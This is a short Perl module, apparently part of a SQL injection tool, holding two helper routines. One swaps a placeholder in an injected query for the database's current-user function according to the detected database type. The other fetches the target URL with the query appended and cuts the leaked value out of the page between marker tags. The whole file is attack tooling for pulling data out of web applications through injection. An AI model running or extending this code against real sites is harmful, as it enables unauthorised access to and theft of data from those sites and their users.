#!/usr/bin/perl
use warnings;
use strict;
use threads;
use WWW::Mechanize;
use Thread::Queue;
use URI;
use 5.010;

sub if_dbname
{
		my ($url,$query);
		($url,$query)=@_;
		if($url eq 'MySQL')
		{
		  $query =~ s/'77777'/user\(\)/;
		  return $query;
		}
	  elsif($url eq 'Microsoft SQL')
		{
		  $query =~ s/'77777'/user_name\(\)/;
			return $query;
		}   
		elsif($url eq 'ORA')
		{
			$query =~ s/'77777'/user_name\(\)/;
			return $query;
		}
}

sub get_values
{
		my($mech,$url,$query,$content);
		my ($tag1,$tag2,$tag1_index,$tag2_index);
		my ($value_len,$value);

		($mech,$url,$query,$tag1,$tag2,$tag1_index)=@_;

		eval{$mech->get($url.$query)};
		$content=$mech->response->decoded_content;
		$content=~s/\s//g;

		$tag1_index=index($content,$tag1,$tag1_index-1);
		$tag2_index=index($content,$tag2,$tag1_index);
		$value_len=$tag2_index-$tag1_index-length($tag1);
		$value=substr($content,$tag1_index+length($tag1),$value_len);

		return $value;				
}
1;
